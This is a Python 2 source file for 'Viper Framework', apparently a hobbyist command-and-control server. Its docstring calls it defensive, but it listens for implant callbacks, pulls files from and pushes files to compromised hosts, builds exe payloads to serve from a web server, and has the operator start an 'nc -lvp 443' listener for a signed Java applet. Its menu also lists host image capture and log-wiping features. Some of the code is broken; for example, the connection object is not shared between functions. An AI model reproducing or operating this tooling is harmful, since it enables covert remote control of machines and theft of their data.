#!/usr/bin/python

import socket
import subprocess
import os
import sys
#import readline
#import commands
import platform
import time


sys.dont_write_bytecode = True


"""
1. This is python framework designed to control agents that get deployed on computers in defense of exploitation frameworks!
2. The framework is designed in order to detect compromised files, processes, and services in order to grab or kill the malware. 
3. This framework can also be used for testing exploitation and enumeration for the purpose of learning offensive for defensible actions. 


"""


def banner():
    print """

    Name : Viper Framework by Black Signals
    Date : 03 March 17
    Version : v1.0

#   __   _____ ___ ___ ___     
#   \ \ / /_ _| _ \ __| _ \  #
#    \ V / | ||  _/ _||   /  #
#     \_/ |___|_| |___|_|_\  #
#                            #
                    Going low and slow

$ Viper>> homehelp for help
$ Viper>> shellhelp for shellhelp
"""

def homemenu():
    """This is the program menu"""
    print "[*] Command options: "
    print
    print "[*] handler ========= > starts the viper server and waits for a call back" 
    print "[*] client2exe ========= > builds a exe payload and stores it inside payloads and www/html for deployment"
    print "[*] teamserver ,chat server, chat stop  ========= > starts the team server, chat factory and console : todo" 
    print "[*] startweb ========= > starts the webserver" 
    print "[*] stopweb ========= > stops the webserver" 
    print "[*] ??????? ========= > " 
    print "\n"

def shellmenu():
    """This is the program menu"""
    print "[*] Command options: "
    print
    print "[*] grab*<filename> ========= > grabs the file and saves it to the local desktop as .txt" #DONE
    print "[*] getenv       ========= >  prints the system information" #Works
    print "[*] getuid       ========= > Get the user level access of the shell" #works
    print "[*] SystemInfo   ========= > Get Fingerprint of the system" #TODO
    print "[*] capture      ========= > take images of the host machine " #Working on this
    print "[*] Cover        ========= > Delete all traces of logs" #TODO
    print "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def transfer(conn,command):
    conn.send(command)
    f = open('/root/Desktop/test.py','wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            f.close()
            break
        f.write(bits)
    f.close()

def send(s, path, command):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        print('[+] File Sent!')
        f.close()
    else:
        print('File does not exist')


def console():
    while(True):
        command = raw_input('$ Viper>> ')
        #command = command.split(" ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close() #close the connection with host
            break
        
        if "homehelp" in command:
            for x in command:
                 x = "help"
                 print("[+] here is the help ")
                 homemenu()
                 break

        if "shellhelp" in command:
            for x in command:
                x = "help"
                print("[+] here is the help ")
                shellmenu()
                break
        
        #elif 'ls' in command:
         #   dirlist = os.listdir(".")
          #  print(dirlist)

        #elif 'dir' in command:
         #   dirlist = os.listdir(".")
          #  print(dirlist)

        #elif 'cd' in command:
         #   for x in command:
          #      if 'cd*' in x:
           #         code, command = command.split("*")
            #        os.chdir(os.path.abspath(command))
             #       #os.chdir(command)
              #      print ("[+] CWD Is " + os.getcwd())
               #     continue

                #elif 'cd' in command:
                 #   code, command = command.split(" ")
                  #  os.chdir(os.path.abspath(command))
                    #os.chdir(command)
                   # print ("[+] CWD Is " + os.getcwd())
                    #continue

        elif 'grab' in command:
            transfer(conn,command)  #usage shell > grab*file

        elif 'send' in command:
            conn.send(command)
            sendW,path = command.split('*')
            try:
                send(conn, path, command)
            except Exception,e:
                s.send (str(e))
                pass

        
        elif 'handler' in command:
            print ( "[+] Starting server standby " + connect())
        
        elif 'client2exe' in command:
            #subprocess.call("payloads/Client2exe.sh", stdin=None, stdout=None, stderr=None, shell=True)
            subprocess.call("payloads/Client2exe.sh 2>/dev/null", shell=True)
            print ( "[+] created the exe inside the payloads folder && copied payload to www/html")
            pass
            #banner()           
            #menu()
        elif 'teamserver' in command:
            os.system("./start-teamserver.sh  --pidfile application/services/teamserver.pid &")
            pass        
 
        elif 'chatserver' in command:
            os.system("twistd -ny application/services/chatserver.py  --pidfile application/services/chatserver.pid &")
            print ( "[+] chatserver reactor started")
            print ( "[+] created the chatserver please connect to server as host @ telnet 127.0.0.1 8123 username host")
            print ( "[*] remember for now you will have to manually kill the chat server type (stopchat) for commands to stop chat ")
            pass 
               
        elif 'stopchat' in command:
            print ( "[+] for now you will have to manually stop chatserver with the usual methods")
            print ( "[+] type in terminal ps aux | grep chatserver and then kill -9 pid")
            pass
            
        elif 'startweb' in command:
                os.chdir("www/")
                os.system("twistd web --path html/.")
                os.chdir("../")
                print "[*] - Starting the webserver reactor"
                print "[*] - The webserver is listening on 127.0.0.1:8080"
                print "[*] - The reactor is running"
                print "[*] - If you deploy the java signed applet then start netcat listener first with nc -lvp 443"
                pass   
            
        elif 'stopweb' in command:
                os.chdir("www/")
                os.system("kill `cat twistd.pid`")
                os.chdir("../")
                print "[*] - Stopping the webserver reactor"
                print "[*] - The webserver shutting down"
                print "[*] - The reactor is stopping"
                pass            

def connect():
    while True:
        ip = (raw_input("Enter the LHOST IP: "))
        port = int(raw_input("Enter the LHOST port: "))
        try:
            s.bind((ip, port))
            print "[+] ip", ip, "is open"
            print "[+] port", port, "is open"
            s.listen(1)
            print '[+] listening for incoming TCP connection on ip address %s and port number %d' % ('ip', port)
            conn, addr = s.accept()
            print '[+] We got a connection from: ',addr
            console()
        except socket.error:
            time.sleep( 3.0)
            print "[+] ip", ip, "is closed"
            print "[+] port", port, "is closed"
            print 'Socket connect failed! Loop up and try socket again'
            connect()

        #else:
         #   conn.send(command)
          #  print conn.recv(1024)
        else:
            print('')

        
        #except KeyboardInterrupt:
        #print 'interrupted!'
        #print 'returning to main program'
        #os.system('python ../../viper.py')        

    
        
def main():
    banner()
    console()
    
if __name__ == "__main__":
    main()
        
